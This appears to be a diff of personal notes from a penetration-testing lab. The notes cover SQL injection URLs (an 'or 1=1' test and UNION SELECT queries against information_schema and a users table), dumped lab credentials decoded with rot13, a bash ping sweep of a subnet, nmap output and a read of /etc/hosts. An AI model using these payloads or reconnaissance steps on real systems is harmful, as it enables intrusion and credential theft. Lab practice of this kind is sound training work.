@@ -767,6 +767,7 @@ user2@PublicFacingWebsite:/$ ip n
 10.10.28.30 dev ens3 lladdr fa:16:3e:f9:39:67 REACHABLE
 
 ip a
+cat/etc/hosts
 192.168.28.181 WebApp
 
 
@@ -778,42 +779,33 @@ http://127.0.0.1:41270/pick.php?product=7%20or%201=1
 
 
 
-Array
-(
-    [0] => user2
-    [name] => user2
-    [1] => RntyrfVfNER78
-    [pass] => RntyrfVfNER78
-)
-1Array
-(
-    [0] => user3
-    [name] => user3
-    [1] => Obo4GURRnccyrf
-    [pass] => Obo4GURRnccyrf
-)
-1Array
-(
-    [0] => Lee_Roth
-    [name] => Lee_Roth
-    [1] => anotherpassword4THEages
-    [pass] => anotherpassword4THEages
-)
-1
+
+URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_name,3 FROM information_schema.tables
+<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_schema,table_name FROM information_schema.tables
+<URL>/uniondemo.php?Selection=2 UNION SELECT table_name,1,column_name FROM information_schema.columns
 
 http://127.0.0.1:41270/pick.php?product=7%20%20Union%20Select%20username,name,user_id%20from%20users
 
 rot13 on the passwords to get actual password
 
-Item 	On Hand 	Price
-HAM 	32 	$15
+
 Aaron 	Aaron 	$1	apasswordyPa$$word 
 user2 	user2 	$2	EaglesIsARE78
 user3 	user3 	$3	Bob4THEEapples
-Lroth 	Lee_Roth 	$4
-ncnffjbeqlCn$$jbeq 	Aaron 	$1
-RntyrfVfNER78 	user2 	$2
-Obo4GURRnccyrf 	user3 	$3		Bob4THEEapples
-anotherpassword4THEages 	Lroth 
+Lroth 	Lee_Roth 	anotherpassword4THEages
+
+
+## run ping sweep script
+for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" & ); done
+
+
+
+Nmap scan report for 192.168.28.179
+22/tcp   open  ssh
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+9999/tcp open  abyss
 
 
